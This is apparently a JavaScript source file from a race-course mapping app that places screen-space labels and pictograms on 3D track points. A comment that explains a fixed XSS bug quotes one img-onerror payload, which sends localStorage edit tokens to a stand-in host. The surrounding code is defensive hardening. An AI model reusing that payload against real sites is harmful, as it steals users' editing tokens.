// Race Studio — cartouches HTML en espace écran, ancrées aux points 3D.
// Règles (Adrien, v6 finale) :
//   · taille CONSTANTE quelle que soit la perspective, toujours face caméra ;
//   · chaque étiquette est COLLÉE à son point : centrée dessus (jeu ≤ 1vw),
//     seul le Y coulisse (≤ 2vh) pour s'éviter — anti-collision glouton par
//     priorité (Départ, puis km croissants, transports), DÉBRAYABLE via
//     params.gpxLabelAvoid ; pas de place → masquée (réapparaît au zoom) ;
//   · l'étiquette Départ/Arrivée est épinglée en haut de page ;
//   · lecture : fondu 1,8 s (.rl-faded), fenêtre gérée par main.js ;
//   · window.__rlSnap (tests) : pose instantanée sans lissage.
// Pure DOM + projection : aucun objet three dans la scène.
import * as THREE from 'three'
import './ui/race-labels.css'

// pictos 14×14 monochromes (currentColor) — langage ShibuMap, inspirés des
// composants Transju (ravito/services) + besoins transport d'Adrien
export const PICTOS = {
  ravito: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M3 1v5M5 1v5M4 6v7M4 1v2"/><path d="M10 1c-1.5 0-2 2-2 3.5S9 7 10 7v6M10 1v6"/></svg>',
  eau: '<svg viewBox="0 0 14 14" fill="currentColor"><path d="M7 1.5C7 1.5 3 6.5 3 9a4 4 0 0 0 8 0c0-2.5-4-7.5-4-7.5z"/></svg>',
  repas: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M2 8h10a5 5 0 0 1-10 0z" fill="currentColor"/><path d="M4 5c0-1 1-1 1-2M7 5c0-1 1-1 1-2"/></svg>',
  dodo: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M1 11V5M1 9h12v2M4 9V7h9a2 2 0 0 0-2-2H4"/><circle cx="3.5" cy="6.5" r="1" fill="currentColor"/></svg>',
  wc: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.3"><text x="7" y="10.5" text-anchor="middle" font-size="9" font-weight="700" fill="currentColor" stroke="none">WC</text></svg>',
  vue: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M1 7s2.5-4 6-4 6 4 6 4-2.5 4-6 4-6-4-6-4z"/><circle cx="7" cy="7" r="1.6" fill="currentColor"/></svg>',
  col: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M1 12l4-7 2.5 4L10 4l3 8"/></svg>',
  secours: '<svg viewBox="0 0 14 14" fill="currentColor"><path d="M5.5 1h3v4.5H13v3H8.5V13h-3V8.5H1v-3h4.5z"/></svg>',
  arrivee: '<svg viewBox="0 0 14 14" fill="currentColor"><path d="M2 1h1v12H2zM4 1h8v6H4zM5 2v1.5h1.5V2zM8 2v1.5h1.5V2zM6.5 3.5V5H8V3.5zM9.5 3.5V5H11V3.5zM5 5v1.5h1.5V5zM8 5v1.5h1.5V5z" fill-rule="evenodd"/></svg>',
  gare: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.3"><rect x="3" y="1.5" width="8" height="8" rx="1.5"/><path d="M3 6.5h8M5 12l-1 1.5M9 12l1 1.5M5.5 9.5V12h3V9.5"/><circle cx="5.5" cy="8" r=".6" fill="currentColor"/><circle cx="8.5" cy="8" r=".6" fill="currentColor"/></svg>',
  bus: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.3"><rect x="2" y="2" width="10" height="9" rx="1.5"/><path d="M2 7h10"/><circle cx="4.5" cy="12.2" r="1" fill="currentColor"/><circle cx="9.5" cy="12.2" r="1" fill="currentColor"/></svg>',
  telepherique: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.3"><path d="M1 3l12-2M7 2.5V5"/><rect x="4" y="5" width="6" height="6" rx="1.2"/><path d="M4 8h6"/></svg>',
  aeroport: '<svg viewBox="0 0 14 14" fill="currentColor"><path d="M13 8l-5-2V2.5a1 1 0 0 0-2 0V6L1 8v1.5l5-1v2.6L4.5 12v1l2.5-.7 2.5.7v-1L8 11.1V8.5l5 1z"/></svg>',
  metro: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.4"><circle cx="7" cy="7" r="5.6"/><path d="M4 9.5V4.8L7 8l3-3.2v4.7" stroke-linejoin="round"/></svg>',
  bateau: '<svg viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.3"><path d="M2 9h10l-1.5 3h-7z" fill="currentColor"/><path d="M7 9V2M7 2l4 5H7"/></svg>',
}
export const PICTO_KEYS = ['ravito', 'eau', 'repas', 'dodo', 'wc', 'vue', 'col', 'secours', 'arrivee']

// Le mot FRANÇAIS de chaque picto — pour tout ce qui doit être LU et pas
// seulement vu (carnet de course : aria-label + title).
// ⚠️ LA CLÉ INTERNE N'EST PAS UN LIBELLÉ. Le carnet posait `title="ravito"`,
// `title="dodo"`, `title="wc"` : un lecteur d'écran énonçait le nom de
// variable, et l'information « il y a de l'eau au prochain point » — celle qui
// décide combien on boit maintenant — restait purement visuelle. Une clé
// absente de cette table rend une chaîne vide : le picto reste muet plutôt que
// d'annoncer un mot faux.
export const LIBELLES_PICTOS = Object.freeze({
  ravito: 'Ravitaillement',
  eau: "Point d'eau",
  repas: 'Repas chaud',
  dodo: 'Base de vie',
  wc: 'Toilettes',
  vue: 'Point de vue',
  col: 'Col',
  secours: 'Poste de secours',
  arrivee: 'Arrivée',
  gare: 'Gare',
  bus: 'Bus',
  telepherique: 'Téléphérique',
  metro: 'Métro',
  aeroport: 'Aéroport',
  bateau: 'Bateau',
})

// L'ORDRE D'IMPORTANCE POUR UN COUREUR — une seule source, ici, à côté des
// deux tables qu'il ordonne.
// ⚠️ LA TRONCATURE ÉTAIT ARBITRAIRE. Le carnet de course n'affiche que trois
// pictos (hauteur FIXE : une rangée qui passe à la ligne se fait couper en
// deux), et il gardait les trois PREMIERS de `suivant.pictos` — c'est-à-dire
// l'ordre de SAISIE de l'organisateur (ui/studio.js pousse au fil des clics,
// sans jamais trier). Une base de vie porte réalistement ravito + eau + repas
// + dodo + wc + secours : le coureur pouvait lire « Toilettes, Point de vue,
// Col » et ne jamais apprendre qu'il y a un poste de secours et de l'eau.
// Trié, il perd les trois moins décisifs au lieu de trois au hasard — et le
// rendu affiche un « +n » pour dire qu'il en manque.
// Une clé absente de cette liste passe en dernier (voir rangPicto).
export const ORDRE_PICTOS = Object.freeze([
  'secours', 'eau', 'ravito', 'repas', 'dodo', 'wc',
  'arrivee', 'col', 'vue',
  'gare', 'bus', 'telepherique', 'metro', 'aeroport', 'bateau',
])
const RANGS = new Map(ORDRE_PICTOS.map((k, i) => [k, i]))
export const rangPicto = (cle) => (RANGS.has(cle) ? RANGS.get(cle) : ORDRE_PICTOS.length)

const CART_H = 26 // hauteur fixe d'un cartouche (px) — pas de mesure DOM
const CHIP_H = 18

// ⚠️ PLUS AUCUN HTML INTERPOLÉ DANS LES CARTOUCHES. Les trois gabarits de
// buildNode() posaient `cart.innerHTML = \`…${item.name}…\`` — et `item.name`
// vient soit d'un <wpt><name> de GPX déposé, soit du payload d'un lien
// /r/<id>, que N'IMPORTE QUI peut publier (netlify/functions/race.mjs
// n'inspecte que le type et la taille de `body.race`). Une course nommée
// `<img src=x onerror=fetch('//moi/'+localStorage.getItem('shibumap.race.secrets'))>`
// s'exécutait dans le DOM de shibumap.com chez CHAQUE destinataire du lien,
// et en repartait avec les jusqu'à 50 jetons d'édition rangés là par
// share-link.js — de quoi réécrire par PUT légitime les parcours d'autres
// organisateurs. Le nom seul suffisait : main.js pousse le cartouche de départ
// dès que `raceState.name` ou `raceState.logo` est non vide, sans qu'aucun
// point de passage ne soit nécessaire.
// Le même bug avait déjà été trouvé, corrigé et verrouillé dans
// src/ui/carnet-course.js — ce fichier-ci, qui lit exactement la même donnée,
// était resté troué. textContent ne peut pas exécuter : c'est la seule parade
// qui ne s'oublie pas.
const el = (tag, cls, parent) => {
  const n = document.createElement(tag)
  if (cls) n.className = cls
  parent?.appendChild(n)
  return n
}

// LE SEUL HTML QUI RESTE : les pictos, un dictionnaire de CONSTANTES du dépôt
// (PICTOS ci-dessus), jamais une chaîne venue d'un GPX ou d'un lien partagé.
// ⚠️ GARDE DE PROPRIÉTÉ PROPRE, pas un `|| ''` : la clé, elle, est bien une
// donnée tierce (parseRace force les pictos en chaînes mais n'en valide pas le
// contenu) et Object.freeze ne coupe pas la chaîne de prototypes — un
// `pictos: ["constructor"]` rendait une FONCTION, truthy, donc un innerHTML
// « function Object() { [native code] } ». Même geste que
// src/ui/carnet-course.js (majPictos).
// Le <template> évite d'emballer chaque SVG dans un <span> : la feuille vise
// `.rl-chip svg` et `.rl-picto svg` en descendants directs, et le picto d'un
// chip est un ITEM DE FLEX (gap 4px) — un emballage aurait décalé le rendu.
// → le NOMBRE d'icônes réellement posées (0 = aucune clé connue), pour que
// l'appelant décide s'il garde son enveloppe.
function poseIcones(parent, cles) {
  let posees = 0
  for (const cle of cles) {
    if (!Object.hasOwn(PICTOS, cle)) continue
    const boite = document.createElement('template')
    boite.innerHTML = PICTOS[cle]
    parent.append(...boite.content.childNodes)
    posees++
  }
  return posees
}

// ══════════ LES CARTOUCHES SUIVENT LE RELIEF (mode continu 3×3) ═════════════
//
// `item.world` vient de `gpx.track.world`, cuit en coordonnées de CHAMP
// (`latLonToWorld`). En mode continu la fenêtre est le décalage entre le champ
// et la géométrie affichée : la retrancher AVANT la projection est tout ce qu'il
// faut pour qu'un cartouche reste planté sur son ravitaillement pendant qu'on
// défile, au lieu de rester collé à l'écran.
//
// `getFenetre` est optionnel : sans lui (tous les appels d'aujourd'hui) le
// décalage vaut zéro et la projection est celle d'avant, au bit près.
const ZERO = { x: 0, z: 0 }

export function buildRaceLabels({ container, camera, getItems, params, onRemove, getFenetre }) {
  const root = document.createElement('div')
  root.className = 'rl-root'
  container.appendChild(root)

  const v = new THREE.Vector3()
  const nodes = new Map() // id → {cart, anchor, leader, item, sig, fw…}
  let frame = 0
  let remeasure = true // re-mesurer les largeurs (fontes tardives, contenu changé)
  let uiCache = { rects: [], cref: null }

  const setDirty = () => { remeasure = true }
  // signature LÉGÈRE d'un item (remplace un JSON.stringify par frame) — le
  // logo (dataURL volumineux) est comparé par sa longueur, pas son contenu
  const sig = (it) => `${it.kind}|${it.name}|${it.km ?? ''}|${it.alt ?? ''}|${it.cutoff ?? ''}|${(it.pictos || []).join(',')}|${it.word ?? ''}|${it.totalKm ?? ''}|${it.logo ? it.logo.length : 0}`

  function buildNode(item) {
    const isChip = item.kind === 'transport'
    const cart = document.createElement('div')
    cart.className = isChip ? 'rl-chip' : item.kind === 'start' ? 'rl-cart rl-start' : 'rl-cart'
    if (item.kind === 'start') {
      // l'étiquette la PLUS importante (Adrien) : fond INVERSÉ (encre), logo
      // passé en blanc, km dans un GROS encadré couleur, START / FINISH en
      // gros, pictos (≤8) en dessous — toujours visible, jamais fenêtrée
      if (item.logo) {
        // .src est une PROPRIÉTÉ : plus de guillemet à casser dans un attribut.
        // Le contenu, lui, est validé en amont (race-model.parseRace applique
        // LOGO_DATA_URL_RE) — ici on ne fait plus que le poser.
        const img = el('img', 'rl-start-logo', cart)
        img.src = item.logo
        img.alt = ''
      }
      const principal = el('span', 'rl-start-main', cart)
      if (item.name) el('b', 'rl-start-name', principal).textContent = item.name
      el('span', 'rl-start-word', principal).textContent = item.word || 'START'
      // posé APRÈS coup : une clé inconnue ne rend rien, et un .rl-picto vide
      // est un rectangle sombre visible (la feuille lui donne un fond)
      const icones = el('span', 'rl-picto')
      if (poseIcones(icones, (item.pictos || []).slice(0, 8))) principal.appendChild(icones)
      el('span', 'rl-start-km', cart).textContent = `${item.totalKm} KM`
    } else if (isChip) {
      if (!poseIcones(cart, [item.pictos?.[0]])) poseIcones(cart, ['bus'])
      el('span', '', cart).textContent = item.name
      const croix = el('span', 'rl-x', cart)
      croix.title = 'Retirer'
      croix.textContent = '✕'
      croix.addEventListener('click', (e) => { e.stopPropagation(); onRemove?.(item.id) })
    } else {
      if (item.km != null) el('span', 'rl-km', cart).textContent = (+item.km).toFixed(item.km % 1 ? 1 : 0)
      el('span', 'rl-name', cart).textContent = item.name || '—'
      if (item.pictos?.length) {
        const icones = el('span', 'rl-picto')
        if (poseIcones(icones, item.pictos)) cart.appendChild(icones)
      }
      const subBits = []
      if (item.alt != null) subBits.push(`${Math.round(item.alt)} m`)
      if (item.cutoff) subBits.push(`barrière ${item.cutoff}`)
      if (subBits.length) el('span', 'rl-sub', cart).textContent = subBits.join(' · ')
    }
    const anchor = document.createElement('i')
    anchor.className = 'rl-anchor'
    const leader = document.createElement('i')
    leader.className = 'rl-leader'
    root.append(leader, anchor, cart)
    return { cart, anchor, leader, item }
  }

  function sync() {
    const items = getItems() || []
    const seen = new Set()
    for (const it of items) {
      seen.add(it.id)
      const g = sig(it)
      const n = nodes.get(it.id)
      if (!n) {
        const nn = buildNode(it)
        nn.sig = g
        nodes.set(it.id, nn)
        remeasure = true
      } else if (n.sig !== g) {
        n.cart.remove(); n.anchor.remove(); n.leader.remove()
        const nn = buildNode(it)
        nn.sig = g
        nodes.set(it.id, nn)
        remeasure = true
      } else n.item = it // rafraîchit la référence world (rebuild de blocs)
    }
    for (const [id, n] of nodes) if (!seen.has(id)) { n.cart.remove(); n.anchor.remove(); n.leader.remove(); nodes.delete(id) }
  }

  function update() {
    if (!params.gpxCartouches) { root.classList.add('rl-hidden'); return }
    root.classList.remove('rl-hidden')
    sync() // toujours — un zoom reconstruit les blocs et leurs Vector3
    if (!nodes.size) return
    const w = container.clientWidth
    const h = container.clientHeight
    // 1. projeter chaque ancre
    const vis = []
    const fen = getFenetre?.() ?? ZERO
    for (const n of nodes.values()) {
      v.set(n.item.world.x - fen.x, n.item.world.y, n.item.world.z - fen.z).project(camera)
      const off = v.z > 1 || v.x < -1.15 || v.x > 1.15 || v.y < -1.15 || v.y > 1.15
      n.off = off
      if (off) { n.cart.classList.add('rl-hidden'); n.anchor.classList.add('rl-hidden'); n.leader.classList.add('rl-hidden'); continue }
      n.cart.classList.remove('rl-hidden'); n.anchor.classList.remove('rl-hidden'); n.leader.classList.remove('rl-hidden')
      // lecture : fondu LENT (1,8 s) d'apparition/disparition via .rl-faded
      const faded = !!n.item.faded
      n.cart.classList.toggle('rl-faded', faded)
      n.anchor.classList.toggle('rl-faded', faded)
      n.leader.classList.toggle('rl-faded', faded)
      n.ax = (v.x * 0.5 + 0.5) * w
      n.ay = (-v.y * 0.5 + 0.5) * h
      // la sous-ligne (altitude/barrière) déborde de ~14px sous le cartouche
      const hasSub = n.item.kind !== 'transport' && (n.item.alt != null || n.item.cutoff)
      n.hh = n.item.kind === 'start' ? CART_H + (n.item.pictos?.length ? 14 : 0) : n.item.kind === 'transport' ? CHIP_H : CART_H + (hasSub ? 14 : 0)
      if (remeasure || !n.fw || frame % 30 === 0 && frame < 200) n.fw = n.cart.offsetWidth
      vis.push(n)
    }
    remeasure = false
    frame++
    if (!vis.length) return
    // 2. placement « panneau planté » (Adrien) : l'étiquette est COLLÉE à
    // son point — en x/z elle ne s'écarte pas de plus de 1vw (donc centrée
    // sur le point, micro-jeu horizontal), et seul le Y coulisse, de 2vh
    // max, pour s'éviter. Face caméra par nature (HTML écran). Pas de place
    // dans ces limites → elle se masque (les prioritaires gagnent).
    // L'étiquette Départ/Arrivée est ÉPINGLÉE en haut de page, au-dessus de
    // toutes les autres, sa ligne de rappel descend vers le point.
    const avoid = params.gpxLabelAvoid !== false
    const vwLim = w / 100 // 1vw
    const vhLim = (2 * h) / 100 // 2vh
    const placed = []
    if (frame % 15 === 0 || !uiCache.cref) {
      const cref = container.getBoundingClientRect()
      const rects = []
      // .ce-elemwrap : la barre liquide (capsule des modes + cartouche du bas,
      // un seul bloc depuis la fusion). Elle manquait à cette liste — les
      // cartouches de course pouvaient passer dessous.
      for (const selUI of ['.gpx-profile:not(.hidden)', '.ce-elemwrap', '.ce-bottombar', '.ce-topbar-left', '.ce-topbar-right', '.ce-hourpill', '.zoom-stepper']) {
        const elUI = document.querySelector(selUI)
        if (!elUI) continue
        const r = elUI.getBoundingClientRect()
        if (!r.width) continue
        rects.push({ x0: r.left - cref.left - 6, y0: r.top - cref.top - 6, x1: r.right - cref.left + 6, y1: r.bottom - cref.top + 6 })
      }
      uiCache = { rects, cref }
    }
    const uiRects = uiCache.rects
    const free = (x, y, ww, hh2) => {
      if (x < 2 || y < 2 || x + ww > w - 2 || y + hh2 > h - 2) return false
      for (const r of uiRects) if (x < r.x1 && r.x0 < x + ww && y < r.y1 && r.y0 < y + hh2) return false
      for (const m of placed) if (x < m.fx + m.fw + 6 && m.fx < x + ww + 6 && y < m.fy + m.hh + 6 && m.fy < y + hh2 + 6) return false
      return true
    }
    // priorité : Départ/Arrivée, puis km croissants, transports en dernier
    const prio = (n) => (n.item.kind === 'start' ? -1e6 : n.item.kind === 'transport' ? 1e6 : n.item.km ?? 0)
    vis.sort((n1, n2) => prio(n1) - prio(n2))
    for (const n of vis) {
      n.declutter = false
      if (n.item.kind === 'start') {
        // la plus haute possible SANS passer derrière l'UI : on descend par
        // pas depuis le haut jusqu'à la première place libre ; si rien ne
        // rentre en pleine largeur, version COMPACTE (mot + km seulement)
        const tryPlace = () => {
          const fx = Math.min(Math.max((w - n.fw) / 2, 2), w - n.fw - 2)
          for (let y = 8; y < h * 0.5; y += 24) {
            if (free(fx, y, n.fw, n.hh)) { n.fx = fx; n.fy = y; return true }
          }
          return false
        }
        let ok2 = tryPlace()
        if (!ok2) {
          n.cart.classList.add('rl-mini') // masque logo + nom → mot + km
          n.fw = n.cart.offsetWidth
          ok2 = tryPlace()
        } else {
          n.cart.classList.remove('rl-mini')
        }
        if (!ok2) { n.fx = Math.min(Math.max((w - n.fw) / 2, 2), w - n.fw - 2); n.fy = 8 }
        n.side = 'top'
        placed.push(n)
        continue
      }
      const cx0 = n.ax - n.fw / 2 // centrée sur le point (x/z fixes)
      const cands = []
      // au-dessus d'abord (panneau planté), puis en dessous — jamais plus
      // loin que 2vh ; micro-jeu horizontal de ±1vw en dernier recours
      for (const dy of [10, Math.max(14, vhLim * 0.5), vhLim]) {
        cands.push([cx0, n.ay - dy - n.hh])
        cands.push([cx0 - vwLim, n.ay - dy - n.hh])
        cands.push([cx0 + vwLim, n.ay - dy - n.hh])
      }
      for (const dy of [10, Math.max(14, vhLim * 0.5), vhLim]) {
        cands.push([cx0, n.ay + dy])
        cands.push([cx0 - vwLim, n.ay + dy])
        cands.push([cx0 + vwLim, n.ay + dy])
      }
      let ok = false
      if (avoid) {
        for (const [x, y] of cands) {
          if (free(x, y, n.fw, n.hh)) {
            n.fx = x
            n.fy = y
            n.side = y < n.ay ? 'top' : 'bottom'
            ok = true
            break
          }
        }
      } else {
        n.fx = Math.min(Math.max(cx0, 2), w - n.fw - 2)
        n.fy = Math.max(2, n.ay - 10 - n.hh)
        n.side = 'top'
        ok = true
      }
      n.declutter = !ok
      if (ok) placed.push(n)
    }

    for (const n of vis) {
      if (n.declutter) {
        n.cart.classList.add('rl-hidden')
        n.anchor.classList.add('rl-hidden')
        n.leader.classList.add('rl-hidden')
      }
    }
    for (const n of placed) {
      // ANTI mal de cœur (Adrien) : le cartouche est RIGIDE avec la carte —
      // c'est son OFFSET par rapport à l'ancre qui est collant : zone morte
      // de 22 px (il ne bouge pas du tout pour les petits reshuffles), puis
      // glissement TRÈS lent vers le nouvel emplacement. L'ancre, elle, suit
      // la carte sans latence, donc rien ne « flotte ».
      const tox = n.fx - n.ax
      const toy = n.fy - n.ay
      if (n.ox == null || window.__rlSnap) { n.ox = tox; n.oy = toy } // première pose : direct (__rlSnap : tests)
      else {
        const d = Math.hypot(tox - n.ox, toy - n.oy)
        // zone morte 8 px pour DÉCLENCHER un mouvement (SOUS les marges de
        // collision de 12 px : une étiquette figée ne peut jamais en
        // recouvrir une autre) — une fois engagé, il glisse JUSQU'AU BOUT
        if (d > 8) n.moving = true
        if (n.moving) {
          n.ox += (tox - n.ox) * 0.04
          n.oy += (toy - n.oy) * 0.04
          if (d < 1) { n.ox = tox; n.oy = toy; n.moving = false }
        }
      }
      n.sx = n.ax + n.ox
      n.sy = n.ay + n.oy
      n.cart.style.transform = `translate(${Math.round(n.sx)}px, ${Math.round(n.sy)}px)`
      n.anchor.style.transform = `translate(${Math.round(n.ax - 3.5)}px, ${Math.round(n.ay - 3.5)}px)`
      let tx
      let ty
      if (n.side === 'right') { tx = n.sx; ty = n.sy + n.hh / 2 }
      else if (n.side === 'left') { tx = n.sx + n.fw; ty = n.sy + n.hh / 2 }
      else {
        tx = Math.min(Math.max(n.ax, n.sx + 8), n.sx + n.fw - 8)
        ty = n.side === 'top' ? n.sy + n.hh : n.sy
      }
      const ang = Math.atan2(ty - n.ay, tx - n.ax)
      n.leader.style.width = `${Math.round(Math.hypot(tx - n.ax, ty - n.ay))}px`
      n.leader.style.transform = `translate(${Math.round(n.ax)}px, ${Math.round(n.ay)}px) rotate(${ang.toFixed(4)}rad)`
    }
  }

  function dispose() { root.remove(); nodes.clear() }

  return { update, setDirty, dispose, _nodes: nodes } // _nodes : sonde de debug (harmless)
}
